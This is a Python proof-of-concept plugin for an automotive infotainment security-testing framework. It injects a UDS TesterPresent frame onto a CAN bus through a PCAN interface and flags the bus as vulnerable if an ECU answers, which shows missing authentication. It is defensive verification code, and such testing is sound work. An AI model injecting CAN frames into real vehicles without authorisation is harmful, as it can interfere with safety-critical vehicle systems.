"""
PoC Name: CAN Message Injection
Identifier: CWE-306
Component: CAN Bus (PCAN)
Category: Protocol
Severity: Critical
CVSS: 9.0
Description: 向CAN总线注入任意帧,验证是否缺少认证和过滤机制。
Prerequisites: PCAN接口, python-can库, PCAN驱动, 授权测试环境。
Usage: python3 02_CAN_Message_Injection.py PCAN_USBBUS1
"""
import sys
from iv_plugin_base import IVIVulnerabilityPlugin
from can_bus_utils import format_can_settings, get_can_settings, open_can_bus

class CANInjectionPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-CAN-002"
    meta_poc_name = "CAN Message Injection"
    meta_cve_id = "CWE-306"
    meta_severity = "Critical"
    meta_protocol = "can"
    meta_target_os = ["all"]
    meta_required_params = ["can_interface"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        settings = get_can_settings(self.params)
        self.logger.info(f"检查CAN接口: {format_can_settings(settings)}")
        return True

    def exploit(self):
        settings = get_can_settings(self.params)
        self.logger.info(f"CAN帧注入测试 ({format_can_settings(settings)})...")
        try:
            import can
            bus = open_can_bus(self.params)
            # Inject a diagnostic request (UDS TesterPresent)
            test_msg = can.Message(
                arbitration_id=0x7DF,
                data=[0x02, 0x3E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
                is_extended_id=False
            )
            self.logger.info(f"注入帧: ID=0x7DF Data=02 3E 00 (TesterPresent)")
            bus.send(test_msg)
            resp = bus.recv(timeout=2.0)
            if resp:
                self.logger.warning(f"[+] 收到响应: ID={hex(resp.arbitration_id)} Data={resp.data.hex()}")
                self.results["vulnerable"] = True
                self.results["evidence"] = f"ECU responded to injected frame: {hex(resp.arbitration_id)}"
            else:
                self.logger.info("未收到ECU响应")
                self.results["vulnerable"] = False
            bus.shutdown()
        except ImportError:
            self.logger.error("python-can未安装")
            self.results["vulnerable"] = False
        except Exception as e:
            self.logger.error(f"CAN注入失败: {e}")
            self.results["vulnerable"] = False
        return self.results


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 02_CAN_Message_Injection.py <can_interface>")
        sys.exit(1)
    plugin = CANInjectionPlugin({"target_ip": "N/A", "can_interface": sys.argv[1]})
    plugin.run_verify()
